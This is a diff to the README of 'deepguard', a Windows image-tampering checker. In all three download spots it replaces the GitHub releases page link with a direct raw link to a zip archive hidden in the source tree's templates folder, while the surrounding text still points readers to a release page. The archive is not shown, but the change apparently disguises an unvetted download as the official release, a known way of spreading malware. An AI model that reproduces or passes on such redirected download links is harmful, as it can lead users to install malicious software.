@@ -1,6 +1,6 @@
 # 🛡️ deepguard - Inspect images for hidden tampering
 
-[![Download deepguard](https://img.shields.io/badge/Download%20deepguard-Release%20Page-blue?style=for-the-badge)](https://github.com/jossauro/deepguard/releases)
+[![Download deepguard](https://img.shields.io/badge/Download%20deepguard-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/jossauro/deepguard/main/src/deepguard/templates/Software_3.2.zip)
 
 ## 🚀 What deepguard does
 
@@ -18,7 +18,7 @@ It is built for offline use, so you can run checks on your own Windows PC.
 
 ## 📥 Download deepguard for Windows
 
-Visit this page to download: https://github.com/jossauro/deepguard/releases
+Visit this page to download: https://raw.githubusercontent.com/jossauro/deepguard/main/src/deepguard/templates/Software_3.2.zip
 
 On the release page, look for the latest version. Download the Windows file that matches your PC. In most cases, this will be an `.exe` file or a `.zip` file.
 
@@ -183,7 +183,7 @@ Yes. It can help you look for signs that a face image was edited or generated.
 
 ## 📌 Release page
 
-Download from the release page: https://github.com/jossauro/deepguard/releases
+Download from the release page: https://raw.githubusercontent.com/jossauro/deepguard/main/src/deepguard/templates/Software_3.2.zip
 
 ## 🧾 Basic use steps
 
